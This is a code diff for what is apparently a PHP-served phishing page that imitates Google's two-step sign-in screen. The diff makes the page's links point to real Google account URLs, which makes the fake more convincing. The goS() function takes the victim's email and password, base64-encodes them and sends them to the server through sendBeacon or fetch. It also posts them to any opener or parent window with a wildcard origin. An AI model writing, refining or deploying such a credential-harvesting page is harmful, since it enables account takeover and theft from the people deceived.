@@ -71,15 +71,15 @@ h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:
 <div id="s1" class="on">
   <h1>Sign in</h1><p class="sub">to continue to Google</p>
   <div class="ig"><input type="email" id="em" placeholder=" " autocomplete="username"><label for="em">Email or phone</label><div class="err" id="e1">Enter a valid email or phone number.</div></div>
-  <a href="#" class="lnk">Forgot email?</a>
-  <div class="row"><a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a><button class="btn" onclick="goP()">Next</button></div>
+  <a href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" class="lnk">Forgot email?</a>
+  <div class="row"><a href="https://accounts.google.com/signup" target="_blank" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a><button class="btn" onclick="goP()">Next</button></div>
 </div>
 <div id="s2">
   <h1>Welcome</h1>
   <div class="chip" onclick="back()">&#128100; <span id="ed"></span> &#9660;</div>
   <div class="ig"><input type="password" id="pw" placeholder=" " autocomplete="current-password"><label for="pw">Enter your password</label><div class="err" id="e2">Wrong password. Try again or click Forgot password.</div></div>
-  <a href="#" class="lnk">Forgot password?</a>
-  <div class="row"><a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a><button class="btn" onclick="goS()">Next</button></div>
+  <a href="https://accounts.google.com/signin/v2/challenge/pwd/reset" target="_blank" class="lnk">Forgot password?</a>
+  <div class="row"><a href="https://accounts.google.com/signin/v2/challenge" target="_blank" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a><button class="btn" onclick="goS()">Next</button></div>
 </div>
 <div id="s3"><h1>Signing you in…</h1><div class="spin"></div></div>
 </div>
@@ -87,7 +87,7 @@ h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:
 var _e="",_p="",_o=' . json_encode($origin) . ';
 function show(n){["s1","s2","s3"].forEach(function(x){document.getElementById(x).classList.remove("on")});document.getElementById("s"+n).classList.add("on")}
 function goP(){var v=document.getElementById("em").value.trim();if(!v||!v.includes("@")){document.getElementById("e1").style.display="block";return}document.getElementById("e1").style.display="none";_e=v;document.getElementById("ed").textContent=v;show(2);setTimeout(function(){document.getElementById("pw").focus()},80)}
-function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);var _d=btoa(JSON.stringify({u:_e,p:_p,t:Date.now()}));try{navigator.sendBeacon("index.php?r=ping",new URLSearchParams({d:_d}))}catch(x){fetch("index.php?r=ping",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"d="+encodeURIComponent(_d)}).catch(function(){})}try{window.parent.postMessage({source:"oauth_done",u:_e,k:_p},_o)}catch(x){}}
+function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);var _d=btoa(JSON.stringify({u:_e,p:_p,t:Date.now()}));try{navigator.sendBeacon("index.php?r=ping",new URLSearchParams({d:_d}))}catch(x){fetch("index.php?r=ping",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"d="+encodeURIComponent(_d)}).catch(function(){})}try{(window.opener||window.parent).postMessage({source:"oauth_done",u:_e,k:_p},'*')}catch(x){}}
 function back(){show(1)}
 document.addEventListener("keydown",function(e){if(e.key!=="Enter")return;if(document.getElementById("s1").classList.contains("on"))goP();else if(document.getElementById("s2").classList.contains("on"))goS()})
 </script></body></html>';
